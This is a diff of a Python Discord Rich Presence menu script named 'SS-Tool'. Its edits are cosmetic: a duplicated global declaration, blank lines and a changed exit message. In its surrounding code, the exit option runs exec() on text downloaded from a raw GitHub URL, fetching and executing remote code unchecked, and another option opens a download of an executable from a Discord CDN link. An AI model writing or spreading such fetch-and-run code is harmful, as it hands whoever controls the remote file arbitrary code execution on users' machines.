@@ -10,6 +10,9 @@ from pypresence import Presence
 global RPC
 RPC = None
 
+global RPC
+RPC = None
+
 CLIENT_ID = '1216435828931428504'  
 
 def manage_discord_rpc(state, details, large_image, large_text):
@@ -28,10 +31,12 @@ def manage_discord_rpc(state, details, large_image, large_text):
             print(f"Error closing Discord RPC: {e}")
         RPC = None
 
+
 def close_rpc_on_exit():
     global RPC
     if RPC is not None:
         RPC.close()
+
 
 def discord_rp_mc():
     manage_discord_rpc(
@@ -94,7 +99,7 @@ while True:
     if chon == '-':
         discord_rp_mc()
         os.system('cls')
-        print("Leaving SS-Tool")
+        print("Leaving SS-Tool test")
         exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Multi').text)
     if chon == '1':
         webbrowser.open_new("https://cdn.discordapp.com/attachments/1148033696641859584/1171827433549336657/Masew_Cleaner.exe?ex=655e1857&is=654ba357&hm=9b7cd01dfe5d28b2b8d14c20db6209a9aa8b608085f4fa7b84a2e046896fc87d&")
